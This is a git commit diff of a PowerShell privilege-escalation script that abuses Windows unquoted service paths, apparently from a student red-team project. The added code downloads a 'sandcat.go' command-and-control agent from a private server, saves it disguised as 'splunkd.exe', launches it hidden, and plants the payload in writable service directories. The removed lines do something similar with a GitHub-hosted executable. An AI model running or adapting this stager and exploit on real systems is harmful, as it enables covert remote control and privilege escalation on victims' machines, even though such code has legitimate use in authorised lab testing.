af5a0d10abb7324e443edf7367f9e2a5479d80c8
prince-spooler <132440531+prince-spooler@users.noreply.github.com>
2023-05-17 19:10:47 +0800

    Update Unquoted-service-path-test-1.ps1

--- Unquoted-service-path-test-1.ps1
+++ Unquoted-service-path-test-1.ps1
@@ -13,7 +13,19 @@ ForEach ($svc in $svclist) {
 
 # Traverse and identify writable directory
 foreach ($path in $servicePaths) {
-    $url = "https://github.com/prince-spooler/FYP/raw/main/Sync.zip"
+    $commands = @"
+$server="http://172.16.172.16:8888"
+$url="$server/file/download"
+$wc=New-Object System.Net.WebClient
+$wc.Headers.add("platform","windows")
+$wc.Headers.add("file","sandcat.go")
+$data=$wc.DownloadData($url)
+get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f
+rm -force "C:\Users\Public\splunkd.exe" -ea ignore
+[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null
+Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden
+Get-Process
+"@
 
     $parentDir = Split-Path -Path $path -Parent
     $dirName = ($path -split "\\")[-2]
@@ -28,17 +40,8 @@ foreach ($path in $servicePaths) {
                 Write-Host "Found writable directory: $parentParentDir"
                 Set-Location $parentParentDir
                 $words = $dirName -split "\s+"
-                $folderName = $words[0]
-                $zipPath = Join-Path -Path $parentParentDir -ChildPath "$folderName.zip"
-                $extractPath = Join-Path -Path $parentParentDir -ChildPath $folderName
-                Invoke-WebRequest $url -OutFile $zipPath -ErrorAction SilentlyContinue
-                Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force -ErrorAction SilentlyContinue
-                $exePath = Join-Path -Path $extractPath -ChildPath "Sync.exe"
-                Copy-Item -Path $exePath -Destination $parentParentDir -Force -ErrorAction SilentlyContinue
-                Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
-                Remove-Item -Path $extractPath -Recurse -Force -ErrorAction SilentlyContinue
-                $fileName = Join-Path -Path $parentParentDir -ChildPath "Sync.exe"
-                & $fileName
+                $fileName = $words[0] + ".exe"
+                $commands | Out-File -FilePath $fileName -Encoding ASCII -NoClobber
                 # If the service is not running, restart the system
                 $svcStatus = Get-Service -DisplayName "TRIGONE Remote System Monitor Service" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Status
                 if ($svcStatus -ne "Running") {
